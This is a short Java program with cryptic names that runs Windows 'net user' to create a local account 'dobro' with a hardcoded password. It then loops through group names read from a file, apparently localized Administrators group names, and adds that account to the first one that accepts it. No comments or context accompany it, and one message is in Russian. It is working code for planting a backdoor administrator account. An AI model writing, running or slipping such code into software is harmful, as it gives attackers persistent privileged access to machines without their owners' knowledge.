import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class ua {

    public static void main(String[] args) {
        try {

            String username = "dobro";
            String password = "xcr380cc385";

            String filePath = "src\\rd5\\lg.txt";

            cuService(username,password);

            if (atgService(username, filePath)) {
                System.out.println("1");
            } else {
                System.err.println("0x22");
            }
        } catch (IOException | InterruptedException e) {
            System.err.println("0x" + e.getMessage());
        }
    }

    private static boolean atgService(String username, String filePath)
            throws IOException, InterruptedException {
        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String adminGroupName;
            while ((adminGroupName = br.readLine()) != null) {
                if (!adminGroupName.isEmpty()) {

                    String atagCommand = "net localgroup " + adminGroupName + " " + username + " /add";
                    System.out.println(atagCommand);

                    Process atagProcess = Runtime.getRuntime().exec(atagCommand);
                    int exitCode = atagProcess.waitFor();

                    if (exitCode == 0) {
                        return true;
                    } else {
                        System.out.println(adminGroupName + " недействительна в этой системе");
                    }
                }
            }
        }
        return false;
    }
        private static void cuService(String username, String password)
                throws IOException, InterruptedException {

            String cuCommand = "net user " + username + " " + password + " /add";

            Process cuProcess = Runtime.getRuntime().exec(cuCommand);
            cuProcess.waitFor();
        }
    }
